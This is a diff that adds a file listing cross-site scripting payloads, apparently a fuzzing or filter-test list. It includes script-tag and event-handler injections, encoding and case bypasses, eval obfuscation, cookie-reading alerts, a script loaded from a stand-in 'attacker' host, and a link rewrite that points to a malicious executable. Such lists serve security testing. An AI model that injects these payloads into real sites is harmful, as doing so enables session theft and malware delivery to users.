@@ -1,0 +1,27 @@
+<script>alert(123)</script>
+<script src="http://attacker/xss.js"></script>
+<ScRiPt>alert(document.cookie)</ScRiPt>
+<script >alert(document.cookie)</script >
+<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a"); AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script>
+" onfocus="alert("xss")
+" onclick=alert("xss")>
+" onfocus="alert(document.cookie)
+" onfocus="alert(1)" autofocus="
+" onfocus="alert('xss')" autofocus="
+%22+onload%3dalert(XSS)
+<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
+<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
+<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
+<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
+<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
+<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
+<output name-"javascript://&newline;\u0061ler&#116(1)" onlick="eval(name)">X</output>
+<output name=&lparjavascript://&newline;\u0061ler&#116(1)&rpar onlick=&lpareval(name)&rpar>X</output>
+
+
+
+%uff1cscript%uff1ealert(‘XSS’);%uff1c/script%uff1e
+
+&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;
+a=\"get\";b=\"URL(\\"\";c=\"javascript&#058;\";d=\"alert('XSS');\\")\";eval(a+b+c+d);
+a=\&lparget\&rpar;b=\&lparURL(\\&lpar\&rpar;c=\&lparjavascript&#058;\&rpar;d=\&lparalert('XSS');\\&rpar)\&rpar;eval(a+b+c+d);
